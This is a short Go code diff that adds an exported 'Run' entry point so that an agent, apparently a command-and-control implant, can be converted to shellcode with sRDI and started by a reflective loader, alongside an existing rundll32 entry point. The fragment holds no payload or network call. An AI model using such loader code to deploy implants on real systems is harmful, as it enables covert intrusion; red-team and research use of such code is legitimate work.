@@ -10,6 +10,13 @@ import (
 
 // These exported functions are only compiled when building with -buildmode=c-shared
 
+//export Run
+func Run() {
+	// Primary entry point for sRDI shellcode conversion
+	// This is called by the reflective loader after DllMain
+	runAgent()
+}
+
 //export Fire
 func Fire(hwnd, hinst, lpszCmdLine unsafe.Pointer, nCmdShow int) {
 	// Primary entry point for rundll32
